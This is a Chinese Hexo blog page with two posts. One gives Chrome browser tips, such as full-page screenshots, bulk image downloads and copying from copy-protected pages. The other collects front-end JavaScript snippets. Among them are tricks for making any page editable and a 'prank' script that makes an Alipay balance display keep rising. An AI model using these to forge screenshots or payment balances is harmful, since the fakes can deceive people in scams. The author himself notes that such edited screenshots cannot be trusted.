<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">
<script>
    (function () {
        if ('') {
            if (prompt('请输入文章密码') !== '') {
                alert('密码错误！');
                if (history.length === 1) {
                    location.replace("https://google.com"); // 这里替换成你的首页
                } else {
                    history.back();
                }
            }
        }
    })();
</script>








<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT">










<meta property="og:type" content="website">
<meta property="og:title" content="苏生不惑的博客">
<meta property="og:url" content="http://yoursite.com/page/12/index.html">
<meta property="og:site_name" content="苏生不惑的博客">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="苏生不惑的博客">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/page/12/">



<meta name="referrer" content="never"> ​​​​


  <title>苏生不惑的博客</title>
  








</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">苏生不惑的博客</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/22/那些你可能不知道的浏览器奇技淫巧/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="苏生不惑">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="苏生不惑的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/05/22/那些你可能不知道的浏览器奇技淫巧/" itemprop="url">那些你可能不知道的浏览器奇技淫巧</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-05-22T11:46:28+08:00">
                2019-05-22
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                  <span class="post-meta-divider">|</span>
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  674 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  2 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>平常工作少不了用浏览器，以下分享一些浏览器的使用技巧，更好的有助于你的工作。</p>
<p>ps: 以下技巧均在 Chrome 浏览器下测试的。</p>
<h3 id="网页长截图"><a href="#网页长截图" class="headerlink" title="网页长截图"></a>网页长截图</h3><p>按 F12 弹出控制台，按 <code>ctrl+shift+p</code> 弹出输入框<br><img src="https://upload-images.jianshu.io/upload_images/17817191-2a40f775c675c0f0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>输入full，选择 <code>capture full size screenshot</code> 然后点击就会对当前网页进图并生成下载一个图片。<br>这个比用 QQ 截图好用的地方就是有滚动条的网页也可以全部截图到，所以叫长截图。<br><img src="https://upload-images.jianshu.io/upload_images/17817191-2e5010296f927367.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="www.google.com.hk_search_newwindow=1&amp;safe=strict&amp;client=aff-maxthon-newtab&amp;channel=t16&amp;source=hp&amp;ei=ll7jXOCENcX68QXZ-pfwBA&amp;q=chrome&amp;oq=chrome&amp;gs_l=psy-ab.12..35i39l2j0i67l3j0i203l5.817.2172..2861...0.0..0.270.855.png"></p>
<h3 id="浏览器秒变编辑器"><a href="#浏览器秒变编辑器" class="headerlink" title="浏览器秒变编辑器"></a>浏览器秒变编辑器</h3><p>浏览器地址栏中输入 <code>data:text/html, &lt;html contenteditable&gt;</code>回车直接变编辑器，这里可以直接输入字符进行编辑了。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/17817191-1b85ba3d313da40e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
<h3 id="编辑网页"><a href="#编辑网页" class="headerlink" title="编辑网页"></a>编辑网页</h3><p>打开网站，地址栏输入<code>javascript:void(document.body.contentEditable=&#39;true&#39;);</code>当然也可以直接在控制台输入 <code>document.body.contentEditable=true</code>或<code>document.designMode = &quot;on&quot;</code>然后就可以随心所欲的改变网页内容了，所以一些网页截图不可信，比如之前有人借用王思聪名义用微博发支付宝的红包，可谓套路满满。<br><img src="https://upload-images.jianshu.io/upload_images/17817191-2534a33f3af8a672.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="https://upload-images.jianshu.io/upload_images/17817191-5c7e18022fcdee74.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
<h3 id="突破禁止复制"><a href="#突破禁止复制" class="headerlink" title="突破禁止复制"></a>突破禁止复制</h3><p>有些网站是复制不了内容的，比如b站 的文章<a href="https://www.bilibili.com/read/cv2444771?from=category_0" target="_blank" rel="noopener">https://www.bilibili.com/read/cv2444771?from=category_0</a> ，这个时候就需要用上控制台了（按F12打开）。<br><img src="https://upload-images.jianshu.io/upload_images/17817191-fb351f76065e5872.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>点击左上角箭头，选择网页内容，可以在控制台看到内容，直接复制就行了。<br><img src="https://upload-images.jianshu.io/upload_images/17817191-696e8cdd55ead0dc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
<h3 id="多账号登录"><a href="#多账号登录" class="headerlink" title="多账号登录"></a>多账号登录</h3><p>平常一个浏览器只能登录一个账号，如果要登2个账号，就需要使用多个浏览器，如果只有一个浏览器怎么办，使用隐身模式（按<code>ctrl+shift+n</code>进入），然后登录另外一个账号。<br><img src="https://upload-images.jianshu.io/upload_images/17817191-d3d622f33fc51b3d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
<h3 id="下载网页图片"><a href="#下载网页图片" class="headerlink" title="下载网页图片"></a>下载网页图片</h3><p>想下载网页上的图片，如果一张一张的另存为，那得费不少体力，这个时候就需要控制台了。<br>比如经常逛知乎可以看到不少妹子自拍，比如这个问题<a href="https://www.zhihu.com/question/26297181/answer/633004295" target="_blank" rel="noopener">https://www.zhihu.com/question/26297181/answer/633004295</a><br><img src="https://upload-images.jianshu.io/upload_images/17817191-9c0ca17d201f9cc3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
<p>打开控制台执行这个 <code>copy($$(&#39;img&#39;).map(function(item){return item.src}).join(&quot;\r\n&quot;))</code>或者<code>[...$$(&quot;img&quot;)].map(a =&gt; a.src).join(&#39;\r\n&#39;)</code>就可以将所有图片地址复制好了。<br>复制所有链接使用<code>copy($$(&#39;a&#39;).map(function(item){return item.href;}))</code></p>
<p><img src="https://upload-images.jianshu.io/upload_images/17817191-a184d1dbe2a33101.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>然后把这些地址放在一个文件<code>url.txt</code>内。<br><img src="https://upload-images.jianshu.io/upload_images/17817191-1b6fe6fd49539d6d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
<p>接下来用<a href="http://gnuwin32.sourceforge.net/packages/wget.htm" target="_blank" rel="noopener">wget</a>一键下载。<code>wget -i url.txt -P ./zhihu</code> 所有图片都下载到本地目录zhihu了。<br><img src="https://upload-images.jianshu.io/upload_images/17817191-2ae82fdb999fb692.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
<p>另外关于知乎还有个隐藏技能，按<code>?</code>可以打开快捷键帮助，不用鼠标也可以玩知乎了，微博也有这功能。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/17817191-4422cd9d2b93704f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="https://upload-images.jianshu.io/upload_images/17817191-69da217d73b812ff.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
<h3 id="公众号：苏生不惑"><a href="#公众号：苏生不惑" class="headerlink" title="公众号：苏生不惑"></a>公众号：苏生不惑</h3><p> <img src="https://upload-images.jianshu.io/upload_images/17817191-6e0079f95d4c0338.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="扫描二维码关注"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/21/前端代码收集/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="苏生不惑">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="苏生不惑的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/05/21/前端代码收集/" itemprop="url">前端代码收集</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-05-21T19:17:58+08:00">
                2019-05-21
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                  <span class="post-meta-divider">|</span>
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  2.4k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  11 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="编辑网页"><a href="#编辑网页" class="headerlink" title="编辑网页"></a>编辑网页</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.designMode = <span class="string">"on"</span></span><br></pre></td></tr></table></figure>
<h3 id="Console中的技巧"><a href="#Console中的技巧" class="headerlink" title="Console中的技巧"></a>Console中的技巧</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">chrome会帮你buffer <span class="number">5</span>个你查看过的DOM对象，你可以直接在Console中用 $<span class="number">0</span>, $<span class="number">1</span>, $<span class="number">2</span>, $<span class="number">3</span>, $<span class="number">4</span>来访问。</span><br><span class="line">你还可以使用像jQuery那样的语法来获得DOM对象，如：$(<span class="string">"#mydiv"</span>)</span><br><span class="line">你还可使用 $$(<span class="string">".class"</span>) 来选择所有满足条件的DOM对象。</span><br><span class="line">你可以使用 getEventListeners($(<span class="string">"selector"</span>)) 来查看某个DOM对象上的事件</span><br><span class="line">还可以使用 monitorEvents($(<span class="string">"selector"</span>)) 来监控相关的事件</span><br></pre></td></tr></table></figure>
<h3 id="将内容复制到剪贴板"><a href="#将内容复制到剪贴板" class="headerlink" title="将内容复制到剪贴板"></a>将内容复制到剪贴板</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;input id=<span class="string">"demoInput"</span> value=<span class="string">"hello world"</span>&gt;</span><br><span class="line">&lt;button id=<span class="string">"btn"</span>&gt;点我复制&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">const btn = document.querySelector('#btn')</span></span><br><span class="line"><span class="regexp">btn.addEventListener('click', () =&gt; &#123;</span></span><br><span class="line"><span class="regexp">  const input = document.querySelector('#demoInput')</span></span><br><span class="line"><span class="regexp">  input.select()</span></span><br><span class="line"><span class="regexp">  if (document.execCommand('copy')) &#123;</span></span><br><span class="line"><span class="regexp">    console.log('复制成功')</span></span><br><span class="line"><span class="regexp">  &#125; else &#123;</span></span><br><span class="line"><span class="regexp">    console.log('复制失败')</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;)</span></span><br><span class="line"><span class="regexp">const btn = document.querySelector('#btn')</span></span><br><span class="line"><span class="regexp">btn.addEventListener('click', () =&gt; &#123;</span></span><br><span class="line"><span class="regexp">  const input = document.createElement('input')</span></span><br><span class="line"><span class="regexp">  document.body.appendChild(input)</span></span><br><span class="line"><span class="regexp">  input.setAttribute('value', '复制我')</span></span><br><span class="line"><span class="regexp">  input.select()</span></span><br><span class="line"><span class="regexp">  if (document.execCommand('copy')) &#123;</span></span><br><span class="line"><span class="regexp">    console.log('复制成功')</span></span><br><span class="line"><span class="regexp">  &#125; else &#123;</span></span><br><span class="line"><span class="regexp">    console.log('复制失败')</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">  document.body.removeChild(input)</span></span><br><span class="line"><span class="regexp">&#125;)</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">https:/</span><span class="regexp">/blog.mutoe.com/</span><span class="number">2019</span>/copy-content-to-clipboard-<span class="keyword">in</span>-javascript/</span><br></pre></td></tr></table></figure>
<h3 id="微信分享"><a href="#微信分享" class="headerlink" title="微信分享"></a>微信分享</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> shareLinkUlr = location.href.split(<span class="string">"#"</span>)[<span class="number">0</span>]; <span class="comment">// 获取当前的url 去掉 # 之后的部分</span></span><br><span class="line">shareLinkUlr = shareLinkUlr.replace(<span class="regexp">/\&amp;/g</span>, <span class="string">'%26'</span>); <span class="comment">// 将 &amp; 替换成 %26</span></span><br><span class="line"><span class="keyword">var</span> shareImgUrl = <span class="string">'http://www.abc.com/images/logo300.jpg'</span>; <span class="comment">// 分享的图片地址</span></span><br><span class="line"><span class="comment">// 获取 config 的内容</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getjssdkconfig</span>(<span class="params">apis,debug,json,link</span>)</span>&#123;</span><br><span class="line">    <span class="comment">//console.log(apis);</span></span><br><span class="line">    <span class="comment">//console.log(debug);</span></span><br><span class="line">    <span class="comment">//console.log(json);</span></span><br><span class="line">    <span class="comment">//console.log(link);</span></span><br><span class="line">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    <span class="keyword">var</span> url = <span class="string">'http://www.abc.com/qxj_jssdkconfig'</span>; <span class="comment">// 这个就是easywechat生成的参数</span></span><br><span class="line">    <span class="keyword">var</span> data = <span class="string">"apis="</span>+apis+<span class="string">"&amp;debug="</span>+debug+<span class="string">"&amp;json="</span>+json+<span class="string">"&amp;url="</span>+link; <span class="comment">// 拼接 get 参数</span></span><br><span class="line">    xhr.open(<span class="string">'GET'</span>,url+<span class="string">"?"</span>+data);</span><br><span class="line">    xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(xhr.readyState===<span class="number">4</span> &amp;&amp; (xhr.status &gt;=<span class="number">200</span> &amp;&amp; xhr.status &lt;=<span class="number">300</span>))&#123;</span><br><span class="line">            <span class="comment">// 获取 config 之后，进行一些操作</span></span><br><span class="line">            <span class="comment">// 需要进行 JSON.parse 获取对象</span></span><br><span class="line">            configJsSDKAndDoSomething(<span class="built_in">JSON</span>.parse(xhr.responseText));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    xhr.send();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 获取config 之后进行的操作</span></span><br><span class="line"><span class="comment">// 因为是使用 ajax 进行config内容，这个方法是在上面运行的</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">configJsSDKAndDoSomething</span>(<span class="params">config</span>)</span>&#123;</span><br><span class="line">    wx.config(config);</span><br><span class="line">    wx.ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 其他的一些操作</span></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//不是wifi环境下提示</span></span><br><span class="line">        wx.getNetworkType(&#123;</span><br><span class="line">            success: <span class="function"><span class="keyword">function</span> (<span class="params">res</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">var</span> networkType = res.networkType; <span class="comment">// 返回网络类型2g，3g，4g，wifi</span></span><br><span class="line">                <span class="keyword">if</span>(networkType!=<span class="string">"wifi"</span>)&#123;</span><br><span class="line">                    <span class="built_in">console</span>.log(<span class="string">"当前你网络环境为"</span>+networkType+<span class="string">""</span>);                    </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    wx.error(<span class="function"><span class="keyword">function</span>(<span class="params">error</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(error);</span><br><span class="line">    &#125;);</span><br><span class="line">    wx.onMenuShareTimeline(&#123;</span><br><span class="line">        title: <span class="string">''</span>, <span class="comment">// 分享标题</span></span><br><span class="line">        link: location.href, <span class="comment">// 分享链接，该链接域名或路径必须与当前页面对应的公众号JS安全域名一致</span></span><br><span class="line">        imgUrl:shareImgUrl, <span class="comment">// 分享图标</span></span><br><span class="line">        success: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            alert(<span class="string">'分享成功'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    wx.onMenuShareAppMessage(&#123;</span><br><span class="line">        title: <span class="string">''</span>, <span class="comment">// 分享标题</span></span><br><span class="line">        desc: <span class="string">''</span>, <span class="comment">// 分享描述</span></span><br><span class="line">        link: location.href, <span class="comment">// 分享链接，该链接域名或路径必须与当前页面对应的公众号JS安全域名一致</span></span><br><span class="line">        imgUrl: shareImgUrl, <span class="comment">// 分享图标</span></span><br><span class="line">        type: <span class="string">'link'</span>, <span class="comment">// 分享类型,music、video或link，不填默认为link</span></span><br><span class="line">        success: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;,</span><br><span class="line">        cancel: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 页面加载完之后进行操作</span></span><br><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// 注意这里的参数</span></span><br><span class="line">    <span class="comment">// apis 使用的参数是 字符串的拼接 这个是和 php 的方法中的处理相对应的</span></span><br><span class="line">    getjssdkconfig(<span class="string">"checkJsApi,onMenuShareTimeline,onMenuShareAppMessage,onMenuShareQQ,onMenuShareWeibo,onMenuShareQZone,hideMenuItems,showMenuItems,hideAllNonBaseMenuItem,showAllNonBaseMenuItem,translateVoice,startRecord,stopRecord,onVoiceRecordEnd,playVoice,onVoicePlayEnd,pauseVoice,stopVoice,uploadVoice,downloadVoice,chooseImage,previewImage,uploadImage,downloadImage,getNetworkType,openLocation,getLocation,hideOptionMenu,showOptionMenu,closeWindow,scanQRCode,chooseWXPay,openProductSpecificView,addCard,chooseCard,openCard"</span>,<span class="literal">false</span>,<span class="literal">false</span>,shareLinkUlr);</span><br><span class="line">&#125;);</span><br><span class="line">https:<span class="comment">//learnku.com/laravel/t/30886</span></span><br></pre></td></tr></table></figure>
<h3 id="支付宝转账恶搞"><a href="#支付宝转账恶搞" class="headerlink" title="支付宝转账恶搞"></a>支付宝转账恶搞</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">/** 支付宝恶搞 **/</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">inc</span>(<span class="params">el</span>) </span>&#123; <span class="comment">// 更新金额数字</span></span><br><span class="line">        el.innerHTML = el.innerHTML.replace(<span class="regexp">/\d+/</span>, <span class="function"><span class="keyword">function</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> +a + rnd(<span class="number">9</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">rnd</span>(<span class="params">n</span>) </span>&#123; <span class="comment">// 1-n 随机数https://www.cnblogs.com/52cik/p/js-alipay-jokes.html</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Math</span>.random() * n | <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">joke</span>(<span class="params">el</span>) </span>&#123; <span class="comment">// 随机增加</span></span><br><span class="line">        inc(el);</span><br><span class="line">        setTimeout(joke, rnd(<span class="number">1e3</span>), el);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> amount = <span class="built_in">document</span>.getElementsByClassName(<span class="string">"amount"</span>);</span><br><span class="line"></span><br><span class="line">    joke(amount[<span class="number">0</span>]); <span class="comment">// 账户余额 随机增加</span></span><br><span class="line">    joke(amount[<span class="number">1</span>]); <span class="comment">// 余额宝 随机增加</span></span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
<h3 id="奇葩字符（不可见字符）"><a href="#奇葩字符（不可见字符）" class="headerlink" title="奇葩字符（不可见字符）"></a>奇葩字符（不可见字符）</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> é 字符，他的 unicode 是 \u00e9, 但是也可以用 <span class="string">'e'</span> + <span class="string">'\u0301'</span> 实现 <span class="string">"é"</span> 前者 length 是 <span class="number">1</span>，后者 length 是 <span class="number">2</span>。</span><br><span class="line"><span class="string">'\u0301'</span> 在这里起到了语调符的作用，然后我就丧心病狂的  <span class="string">'e'</span>+<span class="built_in">Array</span>(<span class="number">20</span>).join(<span class="string">'\u0301'</span>);  </span><br><span class="line"></span><br><span 